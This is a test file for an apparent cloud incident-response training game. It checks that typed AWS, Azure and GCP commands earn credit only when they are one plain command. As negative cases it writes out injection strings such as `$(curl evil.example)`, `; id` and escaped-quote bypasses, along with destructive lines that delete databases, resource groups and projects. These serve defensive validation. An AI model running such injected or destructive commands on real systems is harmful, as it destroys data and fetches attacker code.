// Adversarial checks on how a typed line earns an action (engine.ts actionFor / step):
// compound, substituted, repeated and mis-ordered forms are never credited, canonical forms still are.
import path from 'node:path'
import { describe, expect, it } from 'vitest'
import { loadContent } from '../vite-plugin-content.ts'
import { actionFor, actionsTaken, hasUnsafeSyntax, newSession, repeatsFlag, step, terminalOutput, type GameEvent } from '../src/game/engine.ts'
import { looseAllowShellRegex } from '../src/game/typedLine.ts'
import { ScenarioSchema, type Scenario } from '../src/schema/scenario.ts'
import { atStage } from '../src/schema/stages.ts'

const scenarios = loadContent(path.resolve(import.meta.dirname, '../content')).scenarios
const byId = (id: string) => scenarios.find((s) => s.id === id)!

const RDS = 'aws rds create-db-snapshot --db-instance-identifier orders-db --db-snapshot-identifier orders-db-pre-encrypt'
const QUOTA = 'aws service-quotas request-service-quota-increase --service-code ec2 --quota-code L-1216C47A'
const IAM_OK =
  `aws iam put-role-policy --profile platform-admin --role-name orders-ci-deploy --policy-name orders-rds --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":["rds:CreateDBInstance"],"Resource":"arn:aws:rds:us-east-1:123456789012:db:orders-db"}]}'`
const AZ = 'az role assignment create --assignee 3f9c0e21-6b7a-4d8e-9f10-2c3d4e5f6a7b --role "Website Contributor" --scope /subscriptions/sub1/resourceGroups/rg-web-prod/providers/Microsoft.Web/sites/web-prod'
const GCP = 'gcloud run services update signup-api --region us-central1 --max-instances 20'

// [scenario, stage index, action id, canonical line, lines that must NOT earn it]
// A line that voids a fix may still land a wrong/destructive action (penalty): `penalised` maps line -> that id.
const penalised: Record<string, string> = {
  [`${QUOTA} --desired-value 98 --desired-value 99999`]: 'request-excessive-quota',
  [`${QUOTA} --desired-value 99999 --desired-value 98`]: 'request-excessive-quota',
  [`${AZ} --role Owner`]: 'owner-subscription',
  [`${GCP} --max-instances 300`]: 'raise-max',
}
const table: [string, number, string, string, string[]][] = [
  [
    'terraform-forces-replacement',
    1,
    'create-snapshot',
    RDS,
    [
      `${RDS} && aws rds delete-db-instance --db-instance-identifier orders-db --skip-final-snapshot`,
      `${RDS}; aws rds delete-db-instance --db-instance-identifier orders-db --skip-final-snapshot`,
      `${RDS} | tee /tmp/x`,
      `${RDS} > /tmp/out`,
      `${RDS} $(curl evil.example)`,
      `${RDS} \`curl evil.example\``,
      `${RDS} "$(curl evil.example)"`,
      `${RDS} \${EVIL}`,
      `${RDS} $EVIL`,
      `${RDS}\ncurl evil.example`,
      `${RDS} \\' ; id ; \\'`, // escaped quotes outside quotes are not quotes
      `${RDS} \\" ; id \\"`,
      `${RDS} $'\\'' ; id ; ''`,
      `${RDS} 'unterminated`,
      `${RDS} "unterminated`,
      `${RDS} \\`,
      `${RDS} *`,
      `${RDS} {a,b}`,
      `${RDS} ~root`,
      `${RDS} #x`,
      `${RDS} --db-instance-identifier other-db`,
      `${RDS} --db-snapshot-identifier something-else`,
    ],
  ],
  [
    'terraform-forces-replacement',
    1,
    'copy-encrypted',
    'aws rds copy-db-snapshot --source-db-snapshot-identifier orders-db-pre-encrypt --target-db-snapshot-identifier orders-db-encrypted --kms-key-id alias/orders-db',
    [
      'aws rds copy-db-snapshot --source-db-snapshot-identifier orders-db-pre-encrypt --target-db-snapshot-identifier orders-db-encrypted --kms-key-id --region us-east-1',
      'aws rds copy-db-snapshot --source-db-snapshot-identifier orders-db-pre-encrypt --target-db-snapshot-identifier orders-db-encrypted --kms-key-id alias/a --kms-key-id alias/b',
      'aws rds copy-db-snapshot --source-db-snapshot-identifier orders-db-pre-encrypt --target-db-snapshot-identifier orders-db-encrypted --foo--kms-key-id alias/a',
    ],
  ],
  [
    'terraform-vcpu-limit',
    0,
    'request-quota-increase',
    `${QUOTA} --desired-value 98`,
    [
      `${QUOTA} --desired-value 98 --desired-value 99999`,
      `${QUOTA} --desired-value 99999 --desired-value 98`,
      `${QUOTA} --desired-value 98 && aws ec2 terminate-instances --instance-ids i-1`,
      `${QUOTA} --desired-value 98 $(id)`,
    ],
  ],
  ['terraform-partial-apply-iam', 0, 'grant-rds-permission', IAM_OK, [`${IAM_OK} && aws iam delete-role --role-name orders-ci-deploy`, `${IAM_OK} $(id)`, `${IAM_OK}; id`]],
  ['azure-rbac-wrong-scope', 0, 'assign-prod', AZ, [`${AZ} && az group delete -n rg-web-prod -y`, `${AZ} --role Owner`, `${AZ} $(az account show)`]],
  ['gcp-cloud-run-connection-exhaustion', 0, 'cap-instances', GCP, [`${GCP} && gcloud projects delete apps-prod`, `${GCP} --max-instances 300`, `${GCP} \`id\``]],
]

describe('a typed line earns an action only when it is one plain command', () => {
  for (const [id, stage, action, canonical, bad] of table) {
    const cur = atStage(byId(id), stage)
    it(`${id}/${action}: the canonical form counts`, () => {
      expect(actionFor(cur, canonical)?.id).toBe(action)
    })
    for (const line of bad)
      it(`${id}/${action}: not credited: ${line.slice(0, 110).replace(/\n/g, '\\n')}`, () => {
        expect(actionFor(cur, line)?.id).toBe(penalised[line]) // undefined unless a wrong action legitimately matches
      })
  }

  it('operators inside matching single quotes are data, not syntax (a JSON policy document)', () => {
    expect(actionFor(byId('terraform-partial-apply-iam'), IAM_OK)?.id).toBe('grant-rds-permission')
  })

  it('a rejected compound is not a wrong/destructive match either', () => {
    const cur = atStage(byId('terraform-forces-replacement'), 1)
    const line = 'aws rds delete-db-instance --db-instance-identifier orders-db --skip-final-snapshot && echo done'
    expect(actionFor(cur, line)).toBeUndefined()
    expect(actionFor(cur, line.replace(' && echo done', ''))?.id).toBe('delete-old-first')
  })

  it('a rejected line prints the honest unscripted answer, not an action result', () => {
    const sc = byId('full-disk')
    const out = terminalOutput(sc, 'echo hi; sudo reboot', [])
    expect(out).toContain('no simulated output')
  })
})

describe('terraform-forces-replacement stage 2 order (after:)', () => {
  const sc = byId('terraform-forces-replacement')
  const COPY = 'aws rds copy-db-snapshot --source-db-snapshot-identifier orders-db-pre-encrypt --target-db-snapshot-identifier orders-db-encrypted --kms-key-id alias/orders-db'
  const RESTORE = 'aws rds restore-db-instance-from-db-snapshot --db-instance-identifier orders-db-v2 --db-snapshot-identifier orders-db-encrypted'
  type Ev = { type: GameEvent['type']; id?: string; input?: string }
  const ev = (...e: Ev[]) => e.map((x) => ({ ...x, at: 0 }) as GameEvent)
  const play = (...e: Ev[]) =>
    ev(
      { type: 'START' },
      { type: 'DECLARE_HYPOTHESIS', id: 'replacement' },
      { type: 'TAKE_ACTION', id: 'revert-and-migrate' },
      { type: 'CLOSE_INCIDENT' },
      { type: 'DECLARE_HYPOTHESIS', id: 'needs-encrypted-copy' },
      ...e,
    ).reduce((s, x) => step(sc, s, x), newSession())
  const run = (input: string): Ev => ({ type: 'RUN_COMMAND', input })
  const take = (id: string): Ev => ({ type: 'TAKE_ACTION', id })

  it('restore first is not credited, by typing or by button', () => {
    const s = play(run(RESTORE), take('restore-encrypted'), run(COPY))
    expect(actionsTaken(s.log).has('restore-encrypted')).toBe(false)
    expect(actionsTaken(s.log).has('copy-encrypted')).toBe(false)
    expect(s.feedback?.text).toMatch(/^Not yet:/)
    expect(s.feedback?.tone).toBe('bad')
  })

  it('a refused typed fix says so in the terminal', () => {
    expect(terminalOutput(sc, RESTORE, play().log)).toMatch(/^Not yet:/)
  })

  it('the right order counts and finishes the stage', () => {
    const s = play(run(RDS), run(COPY), run(RESTORE))
    expect([...actionsTaken(s.log)]).toEqual(expect.arrayContaining(['create-snapshot', 'copy-encrypted', 'restore-encrypted']))
    expect(s.feedback?.text).toContain('All fixes applied')
  })

  it('copy before the snapshot is refused, and works once the snapshot exists', () => {
    const early = play(run(COPY))
    expect(actionsTaken(early.log).has('copy-encrypted')).toBe(false)
    const ok = play(run(COPY), run(RDS), run(COPY))
    expect(actionsTaken(ok.log).has('copy-encrypted')).toBe(true)
  })

  it('deleting the live database before cutover is destructive with a final snapshot too', () => {
    const cur = atStage(sc, 1)
    for (const line of [
      'aws rds delete-db-instance --db-instance-identifier orders-db --final-db-snapshot-identifier orders-final',
      'aws rds delete-db-instance --db-instance-identifier orders-db',
      'aws rds delete-db-instance --db-instance-identifier orders-db --skip-final-snapshot',
      'aws rds delete-db-instance --skip-final-snapshot --db-instance-identifier orders-db --delete-automated-backups',
      'aws rds delete-db-instance --db-instance-identifier "orders-db" --skip-final-snapshot',
      "aws rds delete-db-instance --db-instance-identifier=orders-db",
    ])
      expect(actionFor(cur, line)?.id, line).toBe('delete-old-first')
    expect(actionFor(cur, 'aws rds delete-db-instance --db-instance-identifier orders-db-v2')).toBeUndefined()
  })
})

describe('the guard rules', () => {
  it('repeatsFlag: long and short flags, = form, quoted values ignored', () => {
    expect(repeatsFlag('aws x --a 1 --a 2')).toBe(true)
    expect(repeatsFlag('aws x --a=1 --a 2')).toBe(true)
    expect(repeatsFlag('ls -n 1 -n 2')).toBe(true)
    expect(repeatsFlag('aws x --a 1 --b 2')).toBe(false)
    expect(repeatsFlag(`aws x --a '--a --a' "-n -n"`)).toBe(false)
    expect(repeatsFlag('aws x --msg="a --a b" --a 1')).toBe(false) // a flag inside a quoted value is not a flag
    expect(repeatsFlag(`aws x --msg='a --msg b' --msg y`)).toBe(true)
    expect(repeatsFlag('aws x "--a" 1 --a 2')).toBe(true) // quotes do not hide it from the CLI
    expect(repeatsFlag('cmd -- --a --a')).toBe(false) // after -- nothing is a flag
    expect(repeatsFlag('cmd --a 1 -- --a 2')).toBe(false)
  })
  it('hasUnsafeSyntax: operators, substitutions and newlines; quoted data and one closing semicolon are fine', () => {
    for (const bad of ['a && b', 'a; b', 'a | b', 'a > f', 'a < f', 'a & ', 'a `b`', 'a $(b)', 'a "$(b)"', 'a "${B}"', 'a $B', 'a\nb', "a 'b' && c", 'a "b" $(c)'])
      expect(hasUnsafeSyntax(bad), bad).toBe(true)
    // the escaped-quote bypasses: bash sees ; id ; as live operators
    for (const bad of ['echo \\" ; id \\"', "echo \\' ; id ; \\'", "echo $'\\'' ; id ; ''", 'a $\'x\'', 'a "b', "a 'b", 'a \\', 'a *', 'a ?', 'a [x]', 'a {x,y}', 'a ~root', 'a #c', 'a $1'])
      expect(hasUnsafeSyntax(bad), bad).toBe(true)
    for (const ok of ['a --x 1', "a '{\"k\":\"a;b|c>d$(e)\"}'", 'a "b;c"', 'a "x \\" ; y"', "a 'it'", 'a "$"', 'a { 6379 }', 'a \\$HOME', 'a "~ # *"', 'SELECT 1;', 'a b ;'])
      expect(hasUnsafeSyntax(ok), ok).toBe(false)
  })
})

describe('after: validation', () => {
  const base = () => structuredClone(byId('terraform-forces-replacement')) as Scenario
  const issues = (s: Scenario) => {
    const r = ScenarioSchema.safeParse(s)
    return r.success ? [] : r.error.issues.map((i) => i.message)
  }
  const stage2 = (s: Scenario) => s.stages![0].actions
  it('the shipped scenario is valid', () => expect(issues(base())).toEqual([]))
  it('rejects an unknown prerequisite, a self reference and a cycle', () => {
    let s = base()
    stage2(s).find((a) => a.id === 'copy-encrypted')!.after = ['nope']
    expect(issues(s).join()).toMatch(/unknown action "nope"/)
    s = base()
    stage2(s).find((a) => a.id === 'copy-encrypted')!.after = ['copy-encrypted']
    expect(issues(s).join()).toMatch(/after itself/)
    s = base()
    stage2(s).find((a) => a.id === 'create-snapshot')!.after = ['restore-encrypted']
    expect(issues(s).join()).toMatch(/cycle/)
  })
  it('rejects a prerequisite from another stage and a non-fix prerequisite', () => {
    let s = base()
    stage2(s).find((a) => a.id === 'create-snapshot')!.after = ['revert-and-migrate']
    expect(issues(s).join()).toMatch(/unknown action "revert-and-migrate"/)
    s = base()
    stage2(s).find((a) => a.id === 'copy-encrypted')!.after = ['restore-unencrypted']
    expect(issues(s).join()).toMatch(/ordering fix actions/)
  })
  it('rejects a solution path that skips a prerequisite', () => {
    const s = base()
    s.stages![0].solution_paths = [['create-snapshot', 'restore-encrypted']]
    expect(issues(s).join()).toMatch(/without its after: prerequisites/)
  })
  it('allow_shell needs a fully anchored regex', () => {
    const s = base()
    const a = stage2(s).find((x) => x.id === 'create-snapshot')!
    a.allow_shell = true
    expect(issues(s).join()).toMatch(/allow_shell needs a regex that pins the whole line/)
  })
})

describe('allow_shell regex check', () => {
  it('accepts fully pinned regexes, including full-disk truncate-log and the shipped $() lab', () => {
    for (const rx of [
      '^(: ?> ?|> ?)/var/log/app/app\\.log$|^(sudo )?truncate -s ?0 /var/log/app/app\\.log$',
      '^(sudo )?rm -(rf|fr|r) /srv/media(/\\*)?/?$',
      '^az vm stop --ids \\$\\(az vm list (-g|--resource-group) rg-test --query "?\\[\\]\\.id"? (-o|--output) tsv\\)$',
      '^a[.]b$',
    ])
      expect(looseAllowShellRegex(rx), rx).toBeUndefined()
    for (const id of ['full-disk', 'media-disk-migration-major', 'azure-vm-stopped-not-deallocated'])
      for (const a of byId(id).actions.filter((x) => x.allow_shell)) expect(looseAllowShellRegex(a.match_regex!), a.id).toBeUndefined()
  })
  it('rejects half-anchored alternations, trailing literal \\$, and wildcards that can carry operators', () => {
    for (const rx of ['^a|b$', '^a$|^b|c$', '^a$|b$', '^aws foo .*$', '^aws foo .+$', '^aws foo \\S+$', '^aws foo [^ ]+$', '^aws foo \\W$', '^aws foo\\$', '^aws foo', 'aws foo$', '^(a|b)$|c'])
      expect(looseAllowShellRegex(rx), rx).toBeTypeOf('string')
  })
})
